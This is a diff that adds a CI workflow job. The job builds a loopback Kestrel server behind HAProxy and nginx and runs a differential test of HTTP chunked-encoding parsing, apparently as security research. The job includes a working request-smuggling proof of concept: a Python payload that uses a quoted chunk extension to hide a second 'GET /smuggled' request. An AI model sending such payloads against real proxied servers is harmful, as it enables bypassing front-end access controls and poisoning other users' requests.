@@ -172,3 +172,186 @@ jobs:
             /tmp/kestrel-lab/results.json
             /tmp/kestrel-lab/probe.out
             /tmp/kestrel-lab/server.log
+
+
+  proxy-differential:
+    runs-on: ubuntu-latest
+    name: proxy-differential-net10
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-dotnet@v4
+        with:
+          dotnet-version: 10.0.401
+
+      - name: Install local reverse proxies
+        shell: bash
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y haproxy nginx
+
+      - name: Build localhost Kestrel origin
+        shell: bash
+        run: |
+          set -euxo pipefail
+          mkdir -p /tmp/kestrel-proxy-lab
+          cat >/tmp/kestrel-proxy-lab/Lab.csproj <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk.Web">
+            <PropertyGroup>
+              <TargetFramework>net10.0</TargetFramework>
+              <ImplicitUsings>enable</ImplicitUsings>
+              <Nullable>enable</Nullable>
+            </PropertyGroup>
+          </Project>
+          EOF
+          cat >/tmp/kestrel-proxy-lab/Program.cs <<'EOF'
+          var builder = WebApplication.CreateBuilder(args);
+          builder.WebHost.ConfigureKestrel(o => o.ListenLocalhost(5005));
+          var app = builder.Build();
+          app.Run(async context =>
+          {
+              using var body = new MemoryStream();
+              await context.Request.Body.CopyToAsync(body);
+              Console.WriteLine($"ORIGIN_HIT method={context.Request.Method} path={context.Request.Path} bodyHex={Convert.ToHexString(body.ToArray())}");
+              await context.Response.WriteAsync($"{context.Request.Method} {context.Request.Path}");
+          });
+          await app.RunAsync();
+          EOF
+          dotnet build /tmp/kestrel-proxy-lab/Lab.csproj -c Release
+
+      - name: Configure HAProxy and nginx on loopback
+        shell: bash
+        run: |
+          set -euxo pipefail
+          cat >/tmp/haproxy-lab.cfg <<'EOF'
+          global
+              daemon
+          defaults
+              mode http
+              timeout connect 3s
+              timeout client 5s
+              timeout server 5s
+          frontend fe
+              bind 127.0.0.1:5006
+              default_backend be
+          backend be
+              server origin 127.0.0.1:5005
+          EOF
+
+          cat >/tmp/nginx-lab.conf <<'EOF'
+          events {}
+          http {
+            access_log /tmp/nginx-access.log;
+            error_log /tmp/nginx-error.log info;
+            server {
+              listen 127.0.0.1:5007;
+              location / {
+                proxy_http_version 1.1;
+                proxy_request_buffering off;
+                proxy_pass http://127.0.0.1:5005;
+              }
+            }
+          }
+          EOF
+
+      - name: Run exact quoted-extension differential through origin and proxies
+        shell: bash
+        run: |
+          set -euxo pipefail
+          cd /tmp/kestrel-proxy-lab
+          dotnet run --no-build -c Release --project Lab.csproj >origin.log 2>&1 &
+          echo $! > origin.pid
+          haproxy -f /tmp/haproxy-lab.cfg
+          sudo nginx -c /tmp/nginx-lab.conf
+
+          cleanup() {
+            kill "$(cat origin.pid)" 2>/dev/null || true
+            sudo nginx -s stop -c /tmp/nginx-lab.conf 2>/dev/null || true
+            sudo pkill haproxy 2>/dev/null || true
+          }
+          trap cleanup EXIT
+          sleep 1
+
+          cat >proxy_probe.py <<'PY'
+          import json, socket, time
+
+          payload = (
+              b"POST /public HTTP/1.1\r\n"
+              b"Host: localhost\r\n"
+              b"Transfer-Encoding: chunked\r\n"
+              b"\r\n"
+              b'1;a="\r\n'
+              b"X\r\n"
+              b"0\r\n"
+              b"\r\n"
+              b"GET /smuggled HTTP/1.1\r\n"
+              b"Host: localhost\r\n"
+              b"Content-Length: 11\r\n"
+              b"Connection: close\r\n"
+              b"\r\n"
+              b'"\r\n'
+              b"Y\r\n"
+              b"0\r\n"
+              b"\r\n"
+          )
+
+          valid = (
+              b"POST /public HTTP/1.1\r\n"
+              b"Host: localhost\r\n"
+              b"Transfer-Encoding: chunked\r\n"
+              b"Connection: close\r\n"
+              b"\r\n"
+              b"1;a=b\r\n"
+              b"X\r\n"
+              b"0\r\n"
+              b"\r\n"
+          )
+
+          def send(port, data):
+              s = socket.create_connection(("127.0.0.1", port), timeout=3)
+              s.settimeout(3)
+              s.sendall(data)
+              out = bytearray()
+              while True:
+                  try:
+                      p = s.recv(65536)
+                      if not p: break
+                      out.extend(p)
+                  except socket.timeout:
+                      break
+              s.close()
+              raw=bytes(out)
+              return {
+                  "responses": raw.count(b"HTTP/1.1 "),
+                  "statuses": [x.decode("latin1") for x in raw.split(b"\r\n") if x.startswith(b"HTTP/1.1 ")],
+                  "preview": raw[:1000].decode("latin1","replace")
+              }
+
+          results={}
+          for label,port in [("direct",5005),("haproxy",5006),("nginx",5007)]:
+              results[label]={"valid":send(port,valid),"quoted_poc":send(port,payload)}
+              time.sleep(.2)
+          print(json.dumps(results, indent=2, sort_keys=True))
+          open("proxy-results.json","w").write(json.dumps(results, indent=2, sort_keys=True))
+          PY
+
+          python3 proxy_probe.py | tee proxy-probe.out
+          sleep 1
+          echo "=== ORIGIN ==="
+          cat origin.log
+          echo "=== NGINX ACCESS ==="
+          cat /tmp/nginx-access.log || true
+          echo "=== NGINX ERROR ==="
+          cat /tmp/nginx-error.log || true
+
+      - name: Upload proxy differential results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: kestrel-proxy-differential-net10
+          path: |
+            /tmp/kestrel-proxy-lab/proxy-results.json
+            /tmp/kestrel-proxy-lab/proxy-probe.out
+            /tmp/kestrel-proxy-lab/origin.log
+            /tmp/nginx-access.log
+            /tmp/nginx-error.log
